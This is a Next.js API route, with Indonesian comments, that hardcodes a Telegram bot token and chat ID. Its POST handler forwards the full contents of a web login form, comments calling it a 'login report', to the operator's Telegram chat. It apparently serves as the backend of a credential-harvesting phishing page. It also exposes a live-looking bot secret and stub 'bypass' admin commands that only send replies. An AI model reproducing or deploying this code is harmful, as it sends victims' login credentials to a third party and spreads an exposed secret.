import { NextResponse } from 'next/server';

export const dynamic = 'force-dynamic';
export const revalidate = 0;

const BOT_TOKEN = '8208922468:AAGCSBYVOB-aRRz1s__rHZUwh2h5rSMsRbk';
const CHAT_ID = '6481060681'; 

// Fungsi khusus kirim pesan murni langsung ke Telegram lo
async function sendTelegramMessage(text: string) {
  try {
    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text: text,
        parse_mode: 'Markdown'
      })
    });
  } catch (e) {
    console.error("Gagal kirim ke Telegram:", e);
  }
}

export async function POST(request: Request) {
  try {
    const body = await request.json().catch(() => null);
    
    // JALUR 1: Jika ada pesan masuk ketikan dari Telegram lo
    if (body && body.message) {
      const msg = body.message;
      const senderId = msg.from?.id?.toString();
      const command = msg.text?.toLowerCase().trim();

      // Tes Balasan Instan (Tanpa ngecek ID dulu biar lo tau botnya hidup/mati)
      if (command === '/ping') {
        await sendTelegramMessage("🏓 *Pong!* Bot lo berhasil nyaut Selz! Berarti jalur webhook aman.");
        return NextResponse.json({ ok: true });
      }

      // Perintah kendali khusus akun lo
      if (senderId === CHAT_ID) {
        if (command === '/resetlimit' || command === '/risetlimit') {
          await sendTelegramMessage("✅ *Bypass Aktif!* Perintah riset limit kedengeran sama Bot, tapi database dilewati dulu.");
        } else if (command === '/lockweb') {
          await sendTelegramMessage("🔒 *Bypass Aktif!* Perintah kunci web kedengeran sama Bot.");
        } else if (command === '/unlockweb') {
          await sendTelegramMessage("🔓 *Bypass Aktif!* Perintah buka web kedengeran sama Bot.");
        }
      }
      return NextResponse.json({ ok: true });
    }

    // JALUR 2: Menerima tembakan laporan login dari form web lo
    if (body) {
      // Kirim utuh apapun isi objek dari form login lo ke Telegram biar lo tau isinya apa
      await sendTelegramMessage(`⚠️ *Laporan Masuk dari Form Web:* \n\`\`\`json\n${JSON.stringify(body, null, 2)}\n\`\`\``);
      return NextResponse.json({ success: true });
    }

    return NextResponse.json({ ok: true });
  } catch (err) {
    return NextResponse.json({ ok: true });
  }
}
